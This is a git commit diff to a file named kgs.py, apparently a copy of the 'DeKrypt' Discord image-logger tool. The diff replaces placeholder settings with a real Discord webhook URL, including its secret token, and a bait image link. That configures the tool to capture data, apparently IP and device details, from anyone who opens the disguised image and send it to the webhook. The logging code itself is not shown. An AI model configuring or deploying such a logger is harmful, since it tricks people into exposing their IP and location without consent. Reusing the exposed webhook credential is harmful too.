5073b523731ba700c7c77b7a03b33a6d832b93f3
kaya311-kgs <80507634+kaya311-kgs@users.noreply.github.com>
2025-02-18 08:25:37 +0300

    Update kgs.py

--- api /kgs.py
+++ api /kgs.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1341273644021841961/HyfzYweuUNtV5SpmgqBhdYTUIZ8w4_VPsguN_8z1HT6zwCfVWVawLTffFI1t_9t6BGQ_",
+    "image": "https://images.app.goo.gl/VpcsRZGA7Su89nSy5", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
